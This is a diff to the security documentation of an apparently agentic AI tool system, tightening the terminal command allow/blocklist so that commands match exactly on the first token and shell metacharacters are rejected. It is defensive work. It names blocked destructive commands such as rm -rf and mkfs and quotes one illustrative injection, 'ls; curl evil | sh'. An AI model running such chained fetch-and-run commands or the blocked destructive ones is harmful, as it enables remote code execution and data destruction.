@@ -46,9 +46,12 @@ Every approval surfaces, in chat/Telegram/dashboard:
 - **Path allowlist** — tools may only touch configured workspace roots; path
   traversal (`..`), symlink escape, and out-of-root absolute paths are rejected.
 - **Domain allowlist** — browser/network tools may only reach approved domains.
-- **Command allow/blocklist** — terminal tools match an allowlist of read-only
-  commands and a blocklist of destructive patterns (`rm -rf`, `mkfs`, format,
-  registry edits, firewall changes, …).
+- **Command allow/blocklist** — terminal tools match the **exact first token**
+  against an allowlist of read-only commands and a blocklist of destructive
+  patterns (`rm -rf`, `mkfs`, format, registry edits, firewall changes, …).
+  **Shell metacharacters** (`; | & \` $( ${ > < \n \\ ( )`) are rejected outright,
+  so chaining/substitution/redirection (e.g. `ls; curl evil | sh`) can't slip
+  through — and the match is exact, not `startswith`, so `lshw` ≠ `ls`.
 - **Tool allow/blocklist** — a mode (e.g. `PRIVATE_MODE`) can disable tool sets.
 
 ## Emergency stop
